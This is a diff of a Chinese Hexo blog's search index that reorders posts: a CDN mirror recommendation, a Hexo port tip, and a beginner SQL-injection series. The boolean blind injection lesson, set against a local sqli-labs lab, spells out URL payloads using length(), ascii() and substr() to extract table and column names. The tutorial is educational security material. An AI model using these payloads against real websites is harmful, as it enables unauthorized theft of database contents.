@@ -95,34 +95,6 @@
       </tags>
   </entry>
   <entry>
-    <title>ADN公益CDN项目体验——完美替代elemecdn</title>
-    <url>/posts/adn/</url>
-    <content><![CDATA[<p>前一段时间分享了将静态资源发布到npm的方法<del>，其实主要是因为那时可以白嫖elemecdn</del>。然而前一段时间elemecdn已经关闭回源，部分文件已经无法访问。其源站unpkg在中国大陆的访问并不理想，而jsdelivr在前一段时间也遭受过一次DNS污染，无法确保其稳定性。此时，<a href="https://arcitcgn.cn/"></a><a href="https://arcitcgn.cn/">Arcitcgn</a>告知我，他反向代理了unpkg。经过大量测试发现在中国境内各区域的访问速度都十分可观，<a href="https://arcitcgn.cn/">Arcitcgn</a>决定上线ADN公益项目。</p>
-<div class="story post-story"><h2 id="ADN项目使用方法"><a href="#ADN项目使用方法" class="headerlink" title="ADN项目使用方法"></a>ADN项目使用方法</h2><p>使用方法：用<code>adn.arcitcgn.cn</code>代替<code>unpkg.com</code><br>比如：<br>将<a href="https://unpkg.com/jquery@3.2.1/dist/jquery.min.js">https://unpkg.com/jquery@3.2.1/dist/jquery.min.js</a><br>替换为<a href="https://adn.arcitcgn.cn/jquery@3.2.1/dist/jquery.min.js">https://adn.arcitcgn.cn/jquery@3.2.1/dist/jquery.min.js</a></p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">https://adn.arcitcgn.cn/包名@版本号/路径+文件名</span><br></pre></td></tr></tbody></table></figure>
-
-
-
-</div><div class="story post-story"><h2 id="使用体验"><a href="#使用体验" class="headerlink" title="使用体验"></a>使用体验</h2><p>在和项目作者<a href="https://arcitcgn.cn/">Arcitcgn</a>的交流过程中，我了解到该项目在国内同时接入了腾讯云、百度云、又拍云加速，因此在国内拥有不错的速度。当然，项目也仅在国内提供服务。项目详情可以阅读项目作者的文章：</p>
-<div class="tag link"><a class="link-card" title="ADN公益加速 —— Jsdelivr npm（国内）,ElmCDN的优质替代方案" href="https://arcitcgn.cn/171.html"><div class="left"><img src="https://oc.arcitcgn.cn/2022/07/15/62d1542d9fb0f.ico" class="lazyload" data-srcset="https://oc.arcitcgn.cn/2022/07/15/62d1542d9fb0f.ico" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></div><div class="right"><p class="text">ADN公益加速 —— Jsdelivr npm（国内）,ElmCDN的优质替代方案</p><p class="url">https://arcitcgn.cn/171.html</p></div></a></div>
-
-<p>大家可以自行测试项目速度和稳定性。以我的博客为例，放两张对比图直观感受一下速度：</p>
-<div galleryflag="" itemscope="" itemtype="http://schema.org/ImageGallery" class="gallery " data-group="default"><div class="fancybox"><a class="fancybox" pjax-fancybox="" itemscope="" itemtype="http://schema.org/ImageObject" itemprop="url" href="https://oc.arcitcgn.cn/2022/07/15/62d14c9969c6d.png" data-fancybox="default" data-caption="使用unpkg"><img fancybox="" itemprop="contentUrl" src="https://oc.arcitcgn.cn/2022/07/15/62d14c9969c6d.png" class="lazyload" data-srcset="https://oc.arcitcgn.cn/2022/07/15/62d14c9969c6d.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="使用unpkg"></a><span class="image-caption">使用unpkg</span></div></div>
-
-<div galleryflag="" itemscope="" itemtype="http://schema.org/ImageGallery" class="gallery " data-group="default"><div class="fancybox"><a class="fancybox" pjax-fancybox="" itemscope="" itemtype="http://schema.org/ImageObject" itemprop="url" href="https://oc.arcitcgn.cn/2022/07/15/62d14ce109493.png" data-fancybox="default" data-caption="使用ADN"><img fancybox="" itemprop="contentUrl" src="https://oc.arcitcgn.cn/2022/07/15/62d14ce109493.png" class="lazyload" data-srcset="https://oc.arcitcgn.cn/2022/07/15/62d14ce109493.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="使用ADN"></a><span class="image-caption">使用ADN</span></div></div>
-
-<p>这两次打开网站都是在清除浏览器缓存后执行的，可以看到使用ADN比使用unpkg的速度快了7秒多。对于一个网站来说，首次打开速度减少7秒给访客带来的体验的提升是非同小可的。</p>
-</div><div class="story post-story"><h2 id="推荐原因"><a href="#推荐原因" class="headerlink" title="推荐原因"></a>推荐原因</h2><p>从入坑个人博客开始，网站加载速度的优化一直困扰着我。ADN项目提供的免费CDN服务对于个人博主来说，是一个可靠、便捷、零成本的提升网站加载速度的途径。项目的作者有能力也有毅力将项目维护下去，相信项目能够越做越好！</p>
-
-</div>]]></content>
-      <categories>
-        <category>分享</category>
-      </categories>
-      <tags>
-        <tag>公益项目</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>《深入理解计算机系统》第7章：链接 阅读报告</title>
     <url>/posts/csapp-7/</url>
     <content><![CDATA[<p>这篇文章是阅读《深入理解计算机系统》第7章：链接后写下的，很多地方写得并不详细，也无法保证完全正确。主要是为了记录我学习链接相关知识的过程，仅供参考。<span id="more"></span></p>
@@ -354,6 +326,34 @@
       <tags>
         <tag>CSAPP</tag>
         <tag>系统</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>ADN公益CDN项目体验——完美替代elemecdn</title>
+    <url>/posts/adn/</url>
+    <content><![CDATA[<p>前一段时间分享了将静态资源发布到npm的方法<del>，其实主要是因为那时可以白嫖elemecdn</del>。然而前一段时间elemecdn已经关闭回源，部分文件已经无法访问。其源站unpkg在中国大陆的访问并不理想，而jsdelivr在前一段时间也遭受过一次DNS污染，无法确保其稳定性。此时，<a href="https://arcitcgn.cn/"></a><a href="https://arcitcgn.cn/">Arcitcgn</a>告知我，他反向代理了unpkg。经过大量测试发现在中国境内各区域的访问速度都十分可观，<a href="https://arcitcgn.cn/">Arcitcgn</a>决定上线ADN公益项目。</p>
+<div class="story post-story"><h2 id="ADN项目使用方法"><a href="#ADN项目使用方法" class="headerlink" title="ADN项目使用方法"></a>ADN项目使用方法</h2><p>使用方法：用<code>adn.arcitcgn.cn</code>代替<code>unpkg.com</code><br>比如：<br>将<a href="https://unpkg.com/jquery@3.2.1/dist/jquery.min.js">https://unpkg.com/jquery@3.2.1/dist/jquery.min.js</a><br>替换为<a href="https://adn.arcitcgn.cn/jquery@3.2.1/dist/jquery.min.js">https://adn.arcitcgn.cn/jquery@3.2.1/dist/jquery.min.js</a></p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">https://adn.arcitcgn.cn/包名@版本号/路径+文件名</span><br></pre></td></tr></tbody></table></figure>
+
+
+
+</div><div class="story post-story"><h2 id="使用体验"><a href="#使用体验" class="headerlink" title="使用体验"></a>使用体验</h2><p>在和项目作者<a href="https://arcitcgn.cn/">Arcitcgn</a>的交流过程中，我了解到该项目在国内同时接入了腾讯云、百度云、又拍云加速，因此在国内拥有不错的速度。当然，项目也仅在国内提供服务。项目详情可以阅读项目作者的文章：</p>
+<div class="tag link"><a class="link-card" title="ADN公益加速 —— Jsdelivr npm（国内）,ElmCDN的优质替代方案" href="https://arcitcgn.cn/171.html"><div class="left"><img src="https://oc.arcitcgn.cn/2022/07/15/62d1542d9fb0f.ico" class="lazyload" data-srcset="https://oc.arcitcgn.cn/2022/07/15/62d1542d9fb0f.ico" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></div><div class="right"><p class="text">ADN公益加速 —— Jsdelivr npm（国内）,ElmCDN的优质替代方案</p><p class="url">https://arcitcgn.cn/171.html</p></div></a></div>
+
+<p>大家可以自行测试项目速度和稳定性。以我的博客为例，放两张对比图直观感受一下速度：</p>
+<div galleryflag="" itemscope="" itemtype="http://schema.org/ImageGallery" class="gallery " data-group="default"><div class="fancybox"><a class="fancybox" pjax-fancybox="" itemscope="" itemtype="http://schema.org/ImageObject" itemprop="url" href="https://oc.arcitcgn.cn/2022/07/15/62d14c9969c6d.png" data-fancybox="default" data-caption="使用unpkg"><img fancybox="" itemprop="contentUrl" src="https://oc.arcitcgn.cn/2022/07/15/62d14c9969c6d.png" class="lazyload" data-srcset="https://oc.arcitcgn.cn/2022/07/15/62d14c9969c6d.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="使用unpkg"></a><span class="image-caption">使用unpkg</span></div></div>
+
+<div galleryflag="" itemscope="" itemtype="http://schema.org/ImageGallery" class="gallery " data-group="default"><div class="fancybox"><a class="fancybox" pjax-fancybox="" itemscope="" itemtype="http://schema.org/ImageObject" itemprop="url" href="https://oc.arcitcgn.cn/2022/07/15/62d14ce109493.png" data-fancybox="default" data-caption="使用ADN"><img fancybox="" itemprop="contentUrl" src="https://oc.arcitcgn.cn/2022/07/15/62d14ce109493.png" class="lazyload" data-srcset="https://oc.arcitcgn.cn/2022/07/15/62d14ce109493.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="使用ADN"></a><span class="image-caption">使用ADN</span></div></div>
+
+<p>这两次打开网站都是在清除浏览器缓存后执行的，可以看到使用ADN比使用unpkg的速度快了7秒多。对于一个网站来说，首次打开速度减少7秒给访客带来的体验的提升是非同小可的。</p>
+</div><div class="story post-story"><h2 id="推荐原因"><a href="#推荐原因" class="headerlink" title="推荐原因"></a>推荐原因</h2><p>从入坑个人博客开始，网站加载速度的优化一直困扰着我。ADN项目提供的免费CDN服务对于个人博主来说，是一个可靠、便捷、零成本的提升网站加载速度的途径。项目的作者有能力也有毅力将项目维护下去，相信项目能够越做越好！</p>
+
+</div>]]></content>
+      <categories>
+        <category>分享</category>
+      </categories>
+      <tags>
+        <tag>公益项目</tag>
       </tags>
   </entry>
   <entry>
@@ -762,29 +762,6 @@
       </tags>
   </entry>
   <entry>
-    <title>hexo本地服务器更换端口</title>
-    <url>/posts/port/</url>
-    <content><![CDATA[<p>hexo使用<code>hexo s</code>命令会启动本地服务器用以预览博客网页效果。默认启用的端口为4000，但有时可能因为其他进程占用4000端口导致localhost:4000无响应。<span id="more"></span>官方给出的解决办法是，每次运行服务器时输入下列代码：</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">hexo server -p 5000</span><br></pre></td></tr></tbody></table></figure>
-
-<p>当然也可以简写成：</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">hexo s -p 5000</span><br></pre></td></tr></tbody></table></figure>
-
-<p>这样将指定启用5000端口。但这样做仅仅指定这一次打开5000端口，下次仍然会打开默认4000端口。下面介绍一个一劳永逸的方法：打开博客根目录下<code>_config.yml</code>文件，在文件的最后添加以下代码：</p>
-<figure class="highlight yaml"><table><tbody><tr><td class="code"><pre><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">5000</span></span><br><span class="line">  <span class="attr">compress:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">header:</span> <span class="literal">true</span></span><br></pre></td></tr></tbody></table></figure>
-
-<p>当然，可以将port: 后的数值修改成0-65535之间的任意端口（前提是没有被占用）</p>
-<p>（对的，就是在水一篇博文）</p>
-
-]]></content>
-      <categories>
-        <category>前端</category>
-      </categories>
-      <tags>
-        <tag>hexo</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Markdown进阶教程（以Typora为例）</title>
     <url>/posts/mdlearn2/</url>
     <content><![CDATA[<p><a id="1">此篇博客是进阶教程</a><br>建议零基础小白先食用：<a href="https://bowenyoung.cn/posts/mdLearn/">基础教程</a></p>
@@ -941,6 +918,29 @@
       </tags>
   </entry>
   <entry>
+    <title>hexo本地服务器更换端口</title>
+    <url>/posts/port/</url>
+    <content><![CDATA[<p>hexo使用<code>hexo s</code>命令会启动本地服务器用以预览博客网页效果。默认启用的端口为4000，但有时可能因为其他进程占用4000端口导致localhost:4000无响应。<span id="more"></span>官方给出的解决办法是，每次运行服务器时输入下列代码：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">hexo server -p 5000</span><br></pre></td></tr></tbody></table></figure>
+
+<p>当然也可以简写成：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">hexo s -p 5000</span><br></pre></td></tr></tbody></table></figure>
+
+<p>这样将指定启用5000端口。但这样做仅仅指定这一次打开5000端口，下次仍然会打开默认4000端口。下面介绍一个一劳永逸的方法：打开博客根目录下<code>_config.yml</code>文件，在文件的最后添加以下代码：</p>
+<figure class="highlight yaml"><table><tbody><tr><td class="code"><pre><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">5000</span></span><br><span class="line">  <span class="attr">compress:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">header:</span> <span class="literal">true</span></span><br></pre></td></tr></tbody></table></figure>
+
+<p>当然，可以将port: 后的数值修改成0-65535之间的任意端口（前提是没有被占用）</p>
+<p>（对的，就是在水一篇博文）</p>
+
+]]></content>
+      <categories>
+        <category>前端</category>
+      </categories>
+      <tags>
+        <tag>hexo</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>记录第一次参与美漫翻译</title>
     <url>/posts/sp-translate/</url>
     <content><![CDATA[<p>有点小兴奋。我终于也成了一名”烤肉man”。以前看美剧、美漫的时候片头字幕组给我的感觉就是：帅爆了。试想一下，你将自己喜欢看的剧翻译成中文，你的同好看的某一集就是你翻译的——SO DAMN COOL!<span id="more"></span></p>
@@ -993,78 +993,6 @@
 <div galleryflag="" itemscope="" itemtype="http://schema.org/ImageGallery" class="gallery " data-group="one"><div class="fancybox"><a class="fancybox" pjax-fancybox="" itemscope="" itemtype="http://schema.org/ImageObject" itemprop="url" href="https://oc.arcitcgn.cn/2022/06/12/62a53dec406ec.png" data-fancybox="one" data-caption="2-7"><img fancybox="" itemprop="contentUrl" src="https://oc.arcitcgn.cn/2022/06/12/62a53dec406ec.png" class="lazyload" data-srcset="https://oc.arcitcgn.cn/2022/06/12/62a53dec406ec.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="2-7"></a><span class="image-caption">2-7</span></div></div>
 <p>如果看到这个页面，congratulations！sqli-labs靶场环境已经搭建成功了。接下来只要点击page1/2/3/4就可以去完成挑战了！</p>
 </div><div class="story post-story"><h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>还是要强调，不要在不被授权的网站上练习MySQL。<br>下一期（很快555）我们学习基于报错的的注入，也就是less1-less6。</p>
-
-</div>]]></content>
-      <categories>
-        <category>安全</category>
-      </categories>
-      <tags>
-        <tag>SQL注入</tag>
-        <tag>Web安全</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>SQL注入新手教程（三）——布尔盲注</title>
-    <url>/posts/sqli3/</url>
-    <content><![CDATA[<p>在<a href="../../posts/sqli2/">上一期教程</a>中我们学习了基于报错的注入，或者准确地说是GET型基于报错的注入。相信大家也看出来了，这种注入是非常简单的，意味着这种漏洞是非常低级的。我们所见到的大多数网站中都不会出现如此低级的SQL注入漏洞。更多时候页面是不会回显报错语句的，这时候事情就变复杂了。我们无法直接看到报错语句，就需要通过估计不同的查询结果是TRUE还是FALSE来判断某个数据库是否能够注入，这就是盲注！</p>
-<div class="story post-story"><h2 id="布尔盲注原理"><a href="#布尔盲注原理" class="headerlink" title="布尔盲注原理"></a>布尔盲注原理</h2><p>之所以叫盲注，是因为我们在注入的过程中不会看到后端的错误返回语句。此时，如果我们执行的语句返回值为1，页面的显示是一种模样，如果为0，那么页面的显示是另一种模样。利用这样的特性，我们可以在SQL语句中加入逻辑表达式、关系表达式，不断试错，从而理论上能够解得我们所需要的数据，这和猜解密码有点相似。</p>
-</div><div class="story post-story"><h2 id="判断数据库是否能被布尔盲注"><a href="#判断数据库是否能被布尔盲注" class="headerlink" title="判断数据库是否能被布尔盲注"></a>判断数据库是否能被布尔盲注</h2><p>依然，我们首先打开PHPstudy面板，启动WAMP。<br>在浏览器地址栏输入<a href="http://localhost/sqli/Less-8/?id=1">http://localhost/sqli/Less-8/?id=1</a>进入Lesson8（按照你的端口号、目录名等修改）。<br>猜测对应的后端SQL语句为：</p>
-<figure class="highlight sql"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> table_name <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span></span><br></pre></td></tr></tbody></table></figure>
-
-<p>此时页面显示如下：</p>
-<div galleryflag="" itemscope="" itemtype="http://schema.org/ImageGallery" class="gallery " data-group="default"><div class="fancybox"><a class="fancybox" pjax-fancybox="" itemscope="" itemtype="http://schema.org/ImageObject" itemprop="url" href="https://oc.arcitcgn.cn/2022/06/21/62b1bc0d87e23.png" data-fancybox="default" data-caption="有提示文字"><img fancybox="" itemprop="contentUrl" src="https://oc.arcitcgn.cn/2022/06/21/62b1bc0d87e23.png" class="lazyload" data-srcset="https://oc.arcitcgn.cn/2022/06/21/62b1bc0d87e23.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="有提示文字"></a><span class="image-caption">有提示文字</span></div></div>
-
-<p>接着我们尝试破坏查询，在地址栏输入</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">http://localhost/sqli/Less-8/?id=1'</span><br></pre></td></tr></tbody></table></figure>
-
-<p>猜测对应的后端SQL语句为：</p>
-<figure class="highlight sql"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> table_name <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span><span class="string">'</span></span><br></pre></td></tr></tbody></table></figure>
-
-<p>发现页面显示如下：</p>
-<div galleryflag="" itemscope="" itemtype="http://schema.org/ImageGallery" class="gallery " data-group="default"><div class="fancybox"><a class="fancybox" pjax-fancybox="" itemscope="" itemtype="http://schema.org/ImageObject" itemprop="url" href="https://oc.arcitcgn.cn/2022/06/21/62b1bcef999c9.png" data-fancybox="default" data-caption="无提示文字"><img fancybox="" itemprop="contentUrl" src="https://oc.arcitcgn.cn/2022/06/21/62b1bcef999c9.png" class="lazyload" data-srcset="https://oc.arcitcgn.cn/2022/06/21/62b1bcef999c9.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="无提示文字"></a><span class="image-caption">无提示文字</span></div></div>
-
-<p>观察上图我们可以发现，<code>You are in...</code>这段话不见了，说明这段查询语句是有问题的，即我们破坏查询成功了。但是页面没有回显报错信息，说明我们之前用的显注方法失效了。这时我们便要用到布尔盲注了。</p>
-<p>接着我们就继续判断我们传入的参数在后端是如何被封装的。<br>在地址栏输入</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">http://localhost:81/sqli/Less-8/?id=1' and 1=1 --+</span><br></pre></td></tr></tbody></table></figure>
-
-<p>发现那段文字<code>You are in...</code>（后文称提示文字）又重新出现了，这证明：(i)参数是由单引号封装的；(ii)后端对1=1进行了判断并返回TRUE，可以进行布尔盲注。<br>因此推翻之前的SQL语句猜测，此处后端SQL语句形如：</p>
-<figure class="highlight sql"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> table_name <span class="keyword">where</span> id<span class="operator">=</span><span class="string">'1'</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span> <span class="comment">--+'</span></span><br></pre></td></tr></tbody></table></figure>
-
-
-
-</div><div class="story post-story"><h2 id="布尔盲注思路"><a href="#布尔盲注思路" class="headerlink" title="布尔盲注思路"></a>布尔盲注思路</h2><p>确认能够进行布尔盲注后，我们需要想办法获取我们想要的数据。通常会编写脚本来自动进行布尔盲注，但本文重点在于厘清布尔盲注的原理和实现路线，因此采用手动注入的方法。</p>
-<p>首先，我们需要知道当前数据库有哪些表、各自的名称，并判断哪些表含有重要信息；接着，我们需要知道表里有哪些字段、各自的名称，并判断哪些字段含有重要信息；最后我们获取到相应字段对应的每一条记录。</p>
-<p>这个由大及小的思路与之前的盲注并无差别，唯一不同的是这次我们不会直接看到查询的结果，而需要通过逻辑表达式和关系表达式是否返回为TRUE来猜解我们想要得到的信息。在布尔盲注的过程中，由于表中数据的不确定性，如果我们想要通过枚举出查询结果所有可能的值，这个工作量是非常大的。因此，我的方法是先确定数据库中表的数量，再确定每一个表的名称。确定表名时，先得到查询结果的字符串长度区间，再确定字符串长度，先确定每一个字符的ASCII码区间，再确定每一个字符的确切ASCII码。如果你有点迷糊了，没有关系，请接着往下看。</p>
-</div><div class="story post-story"><h2 id="确定数据库中表的数量"><a href="#确定数据库中表的数量" class="headerlink" title="确定数据库中表的数量"></a>确定数据库中表的数量</h2><p>我采用的方法是：让后端判断第n个表的字符串长度是否大于0，如果提示文字出现，则证明数据库有第n个表，否则证明数据库中最多有n-1个表。</p>
-<p>在地址栏输入</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">http://localhost/sqli/Less-8/?id=1' and (length((select table_name from information_schema.tables where table_schema=database() limit 3,1))) &gt; 0 --+</span><br></pre></td></tr></tbody></table></figure>
-
-<p>后端SQL语句形如：</p>
-<figure class="highlight sql"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> table_name <span class="keyword">where</span> id<span class="operator">=</span><span class="string">'1'</span> <span class="keyword">and</span> (length((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">3</span>,<span class="number">1</span>))) <span class="operator">&gt;</span> <span class="number">0</span> <span class="comment">--+'</span></span><br></pre></td></tr></tbody></table></figure>
-
-<p>这段语句的意思为：从数据库的表名中查询id=’1’的所有字段并且当前数据库中的第4个表名字符串长度大于0。其中length()函数作用是取查询结果的字符串长度，用法为length(字符串)。如果你忘了这句语句中其他地方的含义，请见<a href="../sqli2/">上一章</a>。<br>结果，页面显示了提示文字。表明当前数据库至少有4张表。<br>接着我们将地址栏中的字符改为</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">http://localhost/sqli/Less-8/?id=1' and (length((select table_name from information_schema.tables where table_schema=database() limit 4,1))) &gt; 0 --+</span><br></pre></td></tr></tbody></table></figure>
-
-<p>作用是判断第5个表的字符串长度是否大于0，换言之，第5张表是否存在。<br>结果发现页面并没有显示提示文字。<br>由此，我们得到结论：当前数据库中有且仅有4张表。</p>
-</div><div class="story post-story"><h2 id="确定表名的字符串长度"><a href="#确定表名的字符串长度" class="headerlink" title="确定表名的字符串长度"></a>确定表名的字符串长度</h2><p>我们首先确定第一张表的字符串长度，用到的方法与上一小节类似。<br>在地址栏输入</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">http://localhost/sqli/Less-8/?id=1' and (length((select table_name from information_schema.tables where table_schema=database() limit 0,1))) &gt; 5 --+</span><br></pre></td></tr></tbody></table></figure>
-
-<p>作用是判断第一张表表名的字符串长度是否大于5。<br>结果页面显示提示文字，证明第一张表表名的字符串长度大于5。<br>接着我们将5改成6，发现页面不显示提示文字了。答案也就出来了，第一张表表名的字符串长度为6。用同样的方法我们也可以获取其他表名的字符串长度。</p>
-</div><div class="story post-story"><h2 id="确定表名的每一个字符所对应的ASCII码值"><a href="#确定表名的每一个字符所对应的ASCII码值" class="headerlink" title="确定表名的每一个字符所对应的ASCII码值"></a>确定表名的每一个字符所对应的ASCII码值</h2><p>在确定了每张表表名的字符串长度之后，我们就需要确定其每一个字符的具体值。但是表名有可能是字母、数字、标点符号、操作符、特殊字符等，倘若我们一个个尝试，效率会很低。因此我们会想到用ASCII码值来判断字符的具体值。每一个ASCII码对应一个字符，主要对应关系如下图：</p>
-<div galleryflag="" itemscope="" itemtype="http://schema.org/ImageGallery" class="gallery " data-group="default"><div class="fancybox"><a class="fancybox" pjax-fancybox="" itemscope="" itemtype="http://schema.org/ImageObject" itemprop="url" href="https://oc.arcitcgn.cn/2022/06/21/62b1cf9b79cc0.jpg" data-fancybox="default" data-caption="ASCII码对应表"><img fancybox="" itemprop="contentUrl" src="https://oc.arcitcgn.cn/2022/06/21/62b1cf9b79cc0.jpg" class="lazyload" data-srcset="https://oc.arcitcgn.cn/2022/06/21/62b1cf9b79cc0.jpg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="ASCII码对应表"></a><span class="image-caption">ASCII码对应表</span></div></div>
-
-<p>我们这里以第四张表为例（问就是第四张表重要），在地址栏输入</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">http://localhost/sqli/Less-8/?id=1' and (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 3,1),1,1))) &gt; 96 --+</span><br></pre></td></tr></tbody></table></figure>
-
-<p>其中，substr()函数作用为截取字符串中指定位置开始的指定个字符，用法为：substr(字符串,起始位置,截取长度)，起始位置从1开始。ascii()函数作用为取字符的ASCII码值，用法为ascii(字符)。因此上述语句作用为判断第4张表表名的第一个字符ASCII码值是否大于96。<br>结果发现页面显示提示文字，证明第4张表表名的第一个字符ASCII码值大于96，因此很大概率它是一个小写的英文字母。可以将<code>&gt; 96</code>改为<code>&lt; 123</code>尝试一下，发现的确如此。</p>
-<p>接着可以采用二分法来确定该字符的具体值。将<code>&lt; 123</code>改为<code>&gt; 110</code>发现页面显示提示文字，因此将111和122作为两个端点继续划分。将<code>&gt; 110</code>改为<code>&lt; 117</code>发现页面不显示提示文字。因此可以确定该字符为u,v,w,x,y,z中的一个，继续二分法或者枚举都可以得到：该字符为u。</p>
-<p>利用同样的方法，我们猜解得到第四张表的表名为<strong>users</strong>。同样地，我们也能够猜解出其他表名。</p>
-</div><div class="story post-story"><h2 id="确定表中字段数"><a href="#确定表中字段数" class="headerlink" title="确定表中字段数"></a>确定表中字段数</h2><p>与确定数据库中表数量的方法一致，只需将<code>table_name</code>替换为<code>column_name</code>，<code>information_schema.tables</code>替换为<code>information_schema.columns</code>，<code>table_schema=database()</code>替换为<code>table_name='users'</code>即可。如：</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">http://localhost/sqli/Less-8/?id=1' and (length((select column_name from information_schema.columns where table_name='users' limit 3,1))) &gt; 0 --+</span><br></pre></td></tr></tbody></table></figure>
-
-<p>发现页面显示提示文字，证明users表中至少有4个字段。利用和上文一样的方法，最终可以知道users表中有6个字段。</p>
-</div><div class="story post-story"><h2 id="后续"><a href="#后续" class="headerlink" title="后续"></a>后续</h2><p>确定字段的字符串长度，确定字段的每个字符具体值；确定记录数，确定记录的字符串长度，确定记录的每个字符具体值。方法与前文完全一致。有兴趣的小伙伴可以尝试一下继续手动猜解。</p>
-</div><div class="story post-story"><h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>本文主要目的是为读者厘清布尔盲注的原理和思路，实际上，手动进行布尔盲注效率十分低下，几乎用不到。但如果时间充裕，可以感受一下手动进行布尔盲注的过程，私以为这有助于更清晰地认识布尔盲注。</p>
 
 </div>]]></content>
       <categories>
@@ -1268,6 +1196,78 @@
 <div galleryflag="" itemscope="" itemtype="http://schema.org/ImageGallery" class="gallery " data-group="one"><div class="fancybox"><a class="fancybox" pjax-fancybox="" itemscope="" itemtype="http://schema.org/ImageObject" itemprop="url" href="https://oc.arcitcgn.cn/2022/06/12/62a53e7d7736e.png" data-fancybox="one" data-caption="21"><img fancybox="" itemprop="contentUrl" src="https://oc.arcitcgn.cn/2022/06/12/62a53e7d7736e.png" class="lazyload" data-srcset="https://oc.arcitcgn.cn/2022/06/12/62a53e7d7736e.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="21"></a><span class="image-caption">21</span></div></div>
 <p>可以看到用户名和密码就一一对应地显示出来了！我们的目标基本就达到了!<br>当然这仅仅是以LESS1为例查询了部分信息，有兴趣的朋友可以尝试2-6关、查询其他的一些数据（因为是演示项目有些表里面可能没有数据)</p>
 </div><div class="story post-story"><h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>至此，我们对于基于报错的注入的学习就结束了。原理非常简单，但是需要练习来消化一下。<br>下一期的内容我们讲解布尔盲注，也就是LESS8。LESS7是将查询的内容输出为文件，不涉及注入的原理，我们就跳过了。<br>可以通过<a href="https://bowenyoung.cf/atom.xml">RSS订阅本篇博客</a>来更早获知更新信息。也欢迎在博文下方留言或者<a href="mailto:yys958257943@gmail.com">邮箱</a>联系我！</p>
+
+</div>]]></content>
+      <categories>
+        <category>安全</category>
+      </categories>
+      <tags>
+        <tag>SQL注入</tag>
+        <tag>Web安全</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>SQL注入新手教程（三）——布尔盲注</title>
+    <url>/posts/sqli3/</url>
+    <content><![CDATA[<p>在<a href="../../posts/sqli2/">上一期教程</a>中我们学习了基于报错的注入，或者准确地说是GET型基于报错的注入。相信大家也看出来了，这种注入是非常简单的，意味着这种漏洞是非常低级的。我们所见到的大多数网站中都不会出现如此低级的SQL注入漏洞。更多时候页面是不会回显报错语句的，这时候事情就变复杂了。我们无法直接看到报错语句，就需要通过估计不同的查询结果是TRUE还是FALSE来判断某个数据库是否能够注入，这就是盲注！</p>
